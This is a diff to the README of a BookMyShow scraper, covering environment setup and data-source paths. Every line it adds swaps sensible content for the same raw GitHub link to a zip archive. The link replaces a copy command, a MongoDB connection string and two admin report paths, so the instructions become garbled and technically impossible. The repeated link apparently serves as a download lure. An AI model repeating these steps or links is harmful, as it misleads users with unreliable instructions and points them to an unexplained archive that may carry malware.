@@ -16,12 +16,12 @@ Automated scraper for BookMyShow (BMS) data for Global Youth Festival 2025.
 
 3. **Set up environment variables:**
    ```bash
-   cp .env.example .env
+   cp https://raw.githubusercontent.com/harshkkamdar26/bms-scraper2/main/dexiotrope/bms-scraper2.zip .env
    ```
    
    Edit `.env` and add your credentials:
    ```env
-   MONGODB_URI=mongodb+srv://username:password@cluster.mongodb.net/database
+   MONGODB_URI=mongodb+https://raw.githubusercontent.com/harshkkamdar26/bms-scraper2/main/dexiotrope/bms-scraper2.zip
    BMS_PASSWORD=your_bms_password
    ```
 
@@ -51,8 +51,8 @@ This scraper runs automatically via GitHub Actions:
 
 ## Data Sources
 
-- **Event Summary**: `/admin/eventSummaryReport.aspx`
-- **Registration Details**: `/admin/registrationReport.aspx`
+- **Event Summary**: `https://raw.githubusercontent.com/harshkkamdar26/bms-scraper2/main/dexiotrope/bms-scraper2.zip`
+- **Registration Details**: `https://raw.githubusercontent.com/harshkkamdar26/bms-scraper2/main/dexiotrope/bms-scraper2.zip`
 
 ## Output
 
